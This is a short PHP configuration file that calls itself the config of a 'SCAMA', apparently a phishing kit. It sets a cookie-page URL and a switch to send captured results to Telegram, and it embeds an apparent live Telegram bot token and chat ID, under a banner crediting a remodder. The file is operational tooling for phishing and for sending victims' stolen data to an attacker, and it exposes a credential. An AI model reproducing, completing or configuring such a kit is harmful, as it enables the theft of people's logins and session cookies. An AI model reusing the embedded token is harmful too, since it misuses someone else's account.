<?php
###########################################################################################################

$mailurl = ''; # url to the cookie page
$sendtotg               = 1; # <--- SEND RESULTS TO TELEGRAM
$tgbot                  = "5374837971:AAELqpH5dsFDPtZDsXfC_Wf9-oI5Mdix6Gg"; # <--- YOUR TELEGRAM BOT TOKEN WITHOUT "bot" AS PREFIX
$chatid                 = "-682870777"; # <--- YOUR TELEGRAM CHAT ID





#Don't Touch 



/*
████████╗██╗  ██╗██╗   ██╗███████╗███████╗ ██████╗
╚══██╔══╝██║  ██║╚██╗ ██╔╝██╔════╝██╔════╝██╔════╝
██║   ███████║ ╚████╔╝ ███████╗█████╗  ██║     
██║   ██╔══██║  ╚██╔╝  ╚════██║██╔══╝  ██║     
██║   ██║  ██║   ██║   ███████║███████╗╚██████╗
╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝ ╚═════╝
*/
# <------- Remod @ThyOnecy<></>

# <-------  SCAMA CONFIGURATION FILE <></>
?>